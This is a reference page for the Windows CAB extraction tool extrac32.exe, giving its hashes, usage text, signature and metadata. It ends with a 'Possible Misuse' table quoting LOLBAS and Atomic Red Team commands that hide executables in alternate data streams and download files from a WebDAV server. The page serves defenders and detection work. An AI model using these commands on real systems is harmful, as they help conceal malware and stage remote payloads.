---
title: extrac32.exe | Microsoft CAB File Extract Utility
excerpt: What is extrac32.exe?
---

# extrac32.exe 

* File Path: `C:\WINDOWS\system32\extrac32.exe`
* Description: Microsoft CAB File Extract Utility

## Hashes

Type | Hash
-- | --
MD5 | `03DC8507E4B4114B9084507C3CE36539`
SHA1 | `8C9978FF5B30D9F9AD39A243D38CC60984BF6867`
SHA256 | `F4EFF502C423D5BFE12EBFEF6F0EC9EB3CB9A1FB668A850EDBD2A0D353328393`
SHA384 | `517BC8C9EFA9EBDA63C644CAAE0B26F5DBA919D66DAB6FDEE2FB01611C7B09B513022FAEA82C87174DF2D53821A09410`
SHA512 | `E0BD780A0FBEBBA461468335629BBC6E07C2C2E091B41D07A107722BC8E125A546C4D5B47A8851D95A589616476B0AF53D4053DD5B0E15BCCDB667206B232E6F`
SSDEEP | `768:amKyDYJtCwu3LitNC698YkLOTVrmnMPWx2nhoDxeaPD0WqAKAnag:amKy0bCwu3L0NfKMr02W0exeqD0+ag`
IMP | `9E8A016B1763601647B4DFBEF00DAC86`
PESHA1 | `AD0878157AD0BC85C70E95C515E552AD1989A9D0`
PE256 | `745363CE6A346516DCEFD8D1AF8C57AE03FC379AFC66F88403733055DBA76527`

## Runtime Data

### Usage (stdout):
```cmhg
Microsoft (R) Cabinet Extraction Tool
Copyright (c) Microsoft Corporation. All rights reserved..

EXTRACT [/Y] [/A] [/D | /E] [/L dir] cabinet [filename ...]
EXTRACT [/Y] source [newname]
EXTRACT [/Y] /C source destination

  cabinet  - Cabinet file (contains two or more files).
  filename - Name of the file to extract from the cabinet.
             Wild cards and multiple filenames (separated by
             blanks) may be used.

  source   - Compressed file (a cabinet with only one file).
  newname  - New filename to give the extracted file.
             If not supplied, the original name is used.

  /A         Process ALL cabinets.  Follows cabinet chain
             starting in first cabinet mentioned.
  /C         Copy source file to destination (to copy from DMF disks).
  /D         Display cabinet directory (use with filename to avoid extract).
  /E         Extract (use instead of *.* to extract all files).
  /L dir     Location to place extracted files (default is current directory).
  /Y         Do not prompt before overwriting an existing file.
```

### Loaded Modules:

Path |
-- |
C:\WINDOWS\system32\extrac32.exe |
C:\WINDOWS\System32\KERNEL32.DLL |
C:\WINDOWS\System32\KERNELBASE.dll |
C:\WINDOWS\SYSTEM32\ntdll.dll |


## Signature

* Status: Signature verified.
* Serial: `33000002ED2C45E4C145CF48440000000002ED`
* Thumbprint: `312860D2047EB81F8F58C29FF19ECDB4C634CF6A`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: extrac32.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 5.00 (WinBuild.160101.0800)
* Product Version: 5.00
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.
* Machine Type: 64-bit

## File Scan

* VirusTotal Detections: 0/71
* VirusTotal Link: https://www.virustotal.com/gui/file/f4eff502c423d5bfe12ebfef6f0ec9eb3cb9a1fb668a850edbd2a0d353328393/detection


## Possible Misuse

*The following table contains possible examples of `extrac32.exe` being misused. While `extrac32.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `Name: Extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 \\webdavserver\webdav\file.cab c:\ADS\file.txt:file.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Command: extrac32.exe /C C:\Windows\System32\calc.exe C:\Users\user\Desktop\calc.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\System32\extrac32.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Extrac32.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Extrac32.yml) | `- Path: C:\Windows\SysWOW64\extrac32.exe`{:.highlight .language-yaml} | 
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1564.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1564.004/T1564.004.md) | extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)



MIT License. Copyright (c) 2020-2021 Strontic.


